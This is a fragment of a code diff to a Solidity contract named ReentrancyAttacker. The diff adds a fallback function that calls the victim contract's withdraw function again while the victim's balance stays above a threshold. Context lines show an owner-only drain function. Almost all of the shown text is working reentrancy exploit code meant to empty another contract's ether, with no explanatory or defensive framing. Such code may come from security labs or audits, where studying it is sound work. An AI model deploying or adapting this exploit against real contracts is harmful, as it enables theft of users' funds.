@@ -27,6 +27,14 @@ contract ReentrancyAttacker {
             victimContract.withdraw();
         }
     }
+
+    fallback() external payable {
+        uint256 targetBalance = address(victimContract).balance;
+
+        if (targetBalance > 1000000000000000 wei) {
+            victimContract.withdraw();
+        }
+    }
     
     function drain() external {
         require(msg.sender == owner, "Not owner");
